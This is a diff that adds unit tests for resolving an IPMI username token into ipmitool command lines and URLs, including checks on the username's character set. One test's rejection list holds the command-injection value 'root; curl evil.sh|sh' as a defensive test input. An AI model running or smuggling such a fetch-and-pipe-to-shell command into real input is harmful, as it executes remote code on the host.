@@ -974,3 +974,61 @@ describe("profileTokensUsed / hasProfileTokens", () => {
     expect(hasProfileTokens("show version\n")).toBe(false);
   });
 });
+
+/**
+ * Issue #48 PR-B — `${profile.ipmiUsername}`. The value is NOT a field of the
+ * server: the caller resolves it from the linked IPMI auth profile and hands it
+ * in as a fact, which is why the resolver takes a facts record rather than a
+ * `ServerConfig`.
+ */
+describe("resolveProfileTokens — ${profile.ipmiUsername}", () => {
+  it("substitutes the fact the caller supplies", () => {
+    expect(
+      resolved("ipmitool -U ${profile.ipmiUsername} -E sol activate", {
+        ...server(),
+        ipmiUsername: "bmc-operator"
+      })
+    ).toBe("ipmitool -U bmc-operator -E sol activate");
+  });
+
+  it("refuses the run when there is no linked profile, and points at the field to set", () => {
+    const outcome = resolveProfileTokens("ipmitool -U ${profile.ipmiUsername}", server());
+    expect(outcome.ok).toBe(false);
+    if (outcome.ok) return;
+    expect(outcome.error.kind).toBe("missing");
+    expect(outcome.error.token).toBe("ipmiUsername");
+    // Naming a text box that does not exist would send the user hunting; the
+    // repair is a SELECT, and the message says which one and where.
+    expect(outcome.error.message).toContain("IPMI Auth Profile");
+    expect(outcome.error.message).toContain("Advanced options in the server form");
+  });
+
+  it("refuses a blank or whitespace username rather than emitting an empty -U argument", () => {
+    expect(resolveProfileTokens("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: "" }).ok).toBe(false);
+    expect(resolveProfileTokens("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: "   " }).ok).toBe(false);
+  });
+
+  it("applies the username charset — including the positional-@ rule the PowerShell splat finding added", () => {
+    // A profile is as importable as a server record, and this value lands on a
+    // LOCAL command line.
+    expect(resolved("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: "user@REALM.EXAMPLE.COM" }))
+      .toBe("-U user@REALM.EXAMPLE.COM");
+    for (const bad of ["@args", "admin@", "a@b@c", "root; curl evil.sh|sh", "root bmc"]) {
+      const outcome = resolveProfileTokens("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: bad });
+      expect(outcome.ok, `expected refusal for ${bad}`).toBe(false);
+      if (!outcome.ok) expect(outcome.error.kind).toBe("invalid");
+    }
+  });
+
+  it("is never bracketed in a URL — it is not an address", () => {
+    // The URL form's bracketing is scoped to the host-like tokens; a username
+    // that merely looks like an IPv6 literal is still a username.
+    expect(
+      resolved("https://${profile.ipmiHost}/login?u=${profile.ipmiUsername}", {
+        ...server(),
+        ipmiHost: "fe80::1",
+        ipmiUsername: "admin"
+      }, { form: "url" })
+    ).toBe("https://[fe80::1]/login?u=admin");
+  });
+});
